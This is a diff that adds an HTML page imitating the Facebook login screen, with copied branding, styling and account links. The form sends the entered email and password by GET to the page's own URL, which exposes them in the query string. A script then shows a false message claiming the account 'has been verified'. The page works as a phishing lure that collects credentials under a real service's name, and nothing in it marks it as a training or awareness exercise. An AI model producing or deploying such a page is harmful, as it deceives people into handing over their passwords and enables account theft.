@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <title>Log into Facebook</title>
+    <style type="text/css">
+        body { 
+            font-family: Helvetica, Arial, sans-serif; 
+            background-color: #f0f2f5; 
+            margin: 0;
+            padding: 0;
+            color: #1c1e21;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            height: 100vh;
+        } 
+        
+        .header {
+            background-color: #ffffff;
+            width: 100%;
+            padding: 10px 0;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 40px;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        
+        .login-container { 
+            margin: 20px auto; 
+            width: 396px; 
+            padding: 20px; 
+            background: #fff; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        } 
+        
+        .login-container input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            margin: 8px 0; 
+            border: 1px solid #dddfe2; 
+            border-radius: 6px; 
+            font-size: 17px;
+            box-sizing: border-box;
+        } 
+        
+        .login-container input[type="submit"] { 
+            background-color: #1877f2; 
+            color: #fff; 
+            cursor: pointer; 
+            font-weight: bold;
+            font-size: 20px;
+            border: none;
+            height: 48px;
+        } 
+        
+        .login-container input[type="submit"]:hover { 
+            background-color: #166fe5; 
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin: 15px 0;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-block;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .footer {
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div style="width: 980px; margin: 0 auto; text-align: left;">
+            <div class="logo">facebook</div>
+        </div>
+    </div>
+
+    <div class="login-container">
+    <form action="" method="get" id="logMe" onsubmit="return getMe()">
+            <input name="username" id="user" type="text" placeholder="Email or phone number" /><br />
+            <input name="password" id="pass" type="password" placeholder="Password" /><br />
+            <input type="submit" value="Log In" />
+            <a href="#" class="forgot-password">Forgotten password?</a>
+            <div class="divider"></div>
+            <a href="#" class="create-account">Create New Account</a>
+        </form>
+    </div>
+    
+    <div class="footer">
+        <p><strong>Create a Page</strong> for a celebrity, brand or business.</p>
+    </div>
+    
+    <script>
+function getMe(){
+    var username = document.forms['logMe'] ['user'].value;
+    var password = document.forms['logMe']['pass'].value;
+    if (!username || !password){
+        alert('Please, fill the details to verify your account.');
+        return false;
+    }
+    else {
+        alert ('Congrats! your account has been verified.')
+    }
+}
+</script>
+</body>
+</html>
